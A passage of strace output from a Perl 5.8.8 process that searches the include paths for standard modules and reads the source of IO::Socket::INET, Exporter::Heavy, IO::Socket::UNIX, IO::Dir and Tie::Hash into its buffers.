_sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
7695  07:19:58.131635 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.131651 stat64("/etc/perl/Exporter/Heavy.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.131665 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.131678 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.131693 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.131706 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.131720 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.131732 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.131746 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.131758 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.131772 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.131785 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.131799 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.131813 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
7695  07:19:58.131834 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 8
7695  07:19:58.131849 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa0568) = -1 ENOTTY (Inappropriate ioctl for device)
7695  07:19:58.131861 _llseek(8, 0, [0], SEEK_CUR) = 0
7695  07:19:58.131878 read(8, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
7695  07:19:58.132608 read(8, "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
7695  07:19:58.132816 brk(0x829c000)    = 0x829c000
7695  07:19:58.133079 read(8, "", 4096) = 0
7695  07:19:58.133095 close(8)          = 0
7695  07:19:58.134152 read(6, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
7695  07:19:58.140364 _llseek(6, 6496, [6496], SEEK_SET) = 0
7695  07:19:58.140446 _llseek(6, 0, [6496], SEEK_CUR) = 0
7695  07:19:58.140486 close(6)          = 0
7695  07:19:58.140569 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.140597 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.140613 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.140627 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.140641 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.140654 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.140668 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.140680 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.140693 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.140705 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.140718 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.140731 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
7695  07:19:58.140753 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 6
7695  07:19:58.140768 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa0a18) = -1 ENOTTY (Inappropriate ioctl for device)
7695  07:19:58.140779 _llseek(6, 0, [0], SEEK_CUR) = 0
7695  07:19:58.140795 brk(0x82bd000)    = 0x82bd000
7695  07:19:58.140811 read(6, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
7695  07:19:58.141809 _llseek(6, 1386, [1386], SEEK_SET) = 0
7695  07:19:58.141827 _llseek(6, 0, [1386], SEEK_CUR) = 0
7695  07:19:58.141837 close(6)          = 0
7695  07:19:58.141891 stat64("/etc/perl/IO/Dir.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.141907 stat64("/etc/perl/IO/Dir.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.141920 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.141933 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.141950 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.141962 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.142007 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.142019 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.142046 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.142057 stat64("/usr/share/perl5/IO/Dir.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.142070 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.142083 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
7695  07:19:58.142103 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 6
7695  07:19:58.142117 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa0a18) = -1 ENOTTY (Inappropriate ioctl for device)
7695  07:19:58.142129 _llseek(6, 0, [0], SEEK_CUR) = 0
7695  07:19:58.142148 read(6, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    ${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) = @_;\n    -e File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', \".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    }\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
7695  07:19:58.142710 stat64("/etc/perl/Tie/Hash.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.142727 stat64("/etc/perl/Tie/Hash.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.142740 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.142753 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.142767 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.142779 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.142793 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.142804 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.142817 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.142829 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.142842 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.142854 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.142867 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.142880 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
7695  07:19:58.142900 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 8
7695  07:19:58.142914 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa0568) = -1 ENOTTY (Inappropriate ioctl for device)
7695  07:19:58.142926 _llseek(8, 0, [0], SEEK_CUR) = 0
7695  07:19:58.142951 read(8, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      $_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  #  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub 